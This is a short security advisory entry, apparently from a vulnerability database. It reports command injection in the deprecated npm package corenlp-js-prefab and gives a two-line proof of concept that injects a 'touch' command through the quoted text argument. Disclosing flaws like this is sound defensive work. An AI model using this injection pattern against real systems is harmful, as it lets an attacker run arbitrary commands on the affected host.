- id: snykio:npm:corenlp-js-prefab:1050434
  title: Command Injection
  description: |
    [corenlp-js-prefab][1] is a deprecated package. Uses
    corenlp-js-interface with a simple prefab function so you only have to
    send text no extra parameters with each call.

    Affected versions of this package are vulnerable to Command Injection
    via the main function.

    ### PoC   {#poc}

        var a=require("corenlp-js-prefab");
        a.process("') touch JHU # '");



    [1]: https://www.npmjs.com/package/corenlp-js-prefab
